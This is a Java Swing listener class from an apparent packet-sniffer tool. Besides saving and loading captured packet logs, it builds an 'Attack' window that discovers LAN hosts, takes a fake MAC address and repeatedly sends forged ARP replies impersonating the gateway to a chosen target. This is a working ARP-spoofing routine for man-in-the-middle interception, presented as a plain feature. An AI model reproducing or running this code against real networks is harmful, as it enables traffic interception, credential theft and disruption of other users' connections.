package sniff;

import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.CompletableFuture;

import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.ICMPPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;
import poison.arp;
import poison.hostdiscover;
import poison.sender;

import javax.swing.BorderFactory;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextField;;

public class ListenersForAction {
	private static final String MouseEvent = null;
	Vue vue = null;
	public ListenersForAction(Vue originVue) {
		this.vue = originVue;
		
		vue.save.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setDialogTitle("Specify a file to save");
				int userSelection = fileChooser.showSaveDialog(vue);
				if (userSelection == JFileChooser.APPROVE_OPTION) {
				    File file = fileChooser.getSelectedFile();
				    String name = file.getName();
				    int length = name.length();
				    if(length < 5 || !(name.indexOf(".txt") == length - 4)) {
				    	file = new File(file.getAbsolutePath() + ".txt");
				    }
				    try {
				    	FileWriter fr = new FileWriter(file);
					    for(PacketInfo info: vue.model.packetVector) {
					    	fr.write(info.saveFormat.toString().replaceAll("[,][ ]"," / ").replaceAll("\\[|\\]", "") + "\n");
					    }
					    fr.close();
				    } catch(Exception exp) {
				    	exp.printStackTrace();
				    }
				}
			}
		});
		
		
		
		
		
		
		
		vue.ouvrir.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setDialogTitle("Specify a file to open");
				int userSelection = fileChooser.showOpenDialog(vue);
				if (userSelection == JFileChooser.APPROVE_OPTION) {
				    File file = fileChooser.getSelectedFile();
				    try {
				    	ArrayList<String> lines = new ArrayList<String>();
				    	BufferedReader bf = new BufferedReader(new FileReader(file));
				    	String line;
				    	while((line = bf.readLine()) != null) {
				    		//new PacketInfo(line);
				    		vue.model.add(new PacketInfo(line));
				    		/*if(line.split(" / ")[0].equals("TCP")) {
				    			vue.model.add(new PacketInfo(line));
				    		}*/
				    	}
				    } catch(Exception exp) {
				    	exp.printStackTrace();
				    }
				}
			}
		});
		
		this.vue.quitter.addActionListener(new ActionListener(
				) {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				System.exit(0);
			}
		});
		
		this.vue.attack.addActionListener(new ActionListener() {
			
			public boolean stop = false;
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				JFrame attackFrame = new JFrame();
				
				JPanel jp = new JPanel(new GridLayout(3, 1));
				
				DefaultListModel<String> dlm = new DefaultListModel<String>();
				JList<String> list = new JList<String>(dlm);
				attackFrame.add(jp);
				
				NetworkInterface device = null;
				device = Global.getDevice();
				hostdiscover hosty = new hostdiscover(device);
				hosty.discover();
				String gatewayip = hosty.getGatewayIp();
				HashMap<String,String> ip_mac_list = hosty.getHosts();
				ip_mac_list.forEach((key, value) -> {
					if(!key.equals(gatewayip))
						dlm.addElement(key);
				});
				jp.add(list);
				
				
				JPanel macJp = new JPanel(new GridLayout(1, 2));
				JLabel macLbl = new JLabel("Fake Mac:");
				macJp.add(macLbl);
				JTextField macTxt = new JTextField();
				macJp.add(macTxt);
				
				jp.add(macJp);
				
				JButton attackBtn = new JButton("Attack");
				
				JButton stopBtn = new JButton("Stop");
				
				JPanel attackBtnJp = new JPanel(new FlowLayout());
				attackBtnJp.add(attackBtn);
				attackBtnJp.add(stopBtn);
				
				jp.add(attackBtnJp);
				
				
				attackFrame.setSize(300, 200);
				attackFrame.setVisible(true);
				
				
				
				
				
				stopBtn.addActionListener(new ActionListener() {
					
					@Override
					public void actionPerformed(ActionEvent e) {
						// TODO Auto-generated method stub
						stop = true;
					}
				});
				
				
				attackBtn.addActionListener(new ActionListener() {
					@Override
					public void actionPerformed(ActionEvent e) {
						// TODO Auto-generated method stub
						
						stop = false;
						String targetIp = list.getSelectedValue();
						if(targetIp == null) {
							return;
						}
						System.out.println("Attacking " + targetIp);
						String macStr = macTxt.getText();
						
						byte[] fake_mac = MAC.StringToBytes(macStr);
						if(fake_mac == null) {
							System.err.println("Enter a valid mac address!");
							return;
						} else {
							
							//attack here
							
							NetworkInterface device = Global.getDevice();
							
							//build fake packet
							arp fake = new arp(null);
							try {
								fake.buildDevice("fak0", "ihniwid", "fak0", "fake", fake_mac,
										gatewayip, Global.get_inet4(Global.getDevice()).subnet.toString().split("/")[1]);
							} catch (Exception exp) {
								exp.printStackTrace();
							}
							
							
							
							CompletableFuture.runAsync(() -> {
								sender ARPSender = null;
								try {
									ARPSender = new sender(Global.getDevice());
								} catch (NullPointerException | IOException e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
									return;
								}
								while(!stop) {
									try {
										String targetMac = ip_mac_list.get(targetIp);
										ARPSender.send(fake.build_reply_packet(targetIp, targetMac, device.mac_address));
										//sleep a little
										Thread.sleep(80);
									} catch (Exception exp) {
										exp.printStackTrace();
									}
								}
								
							});
							
						}
					}
				});
			}
		});
	}
}
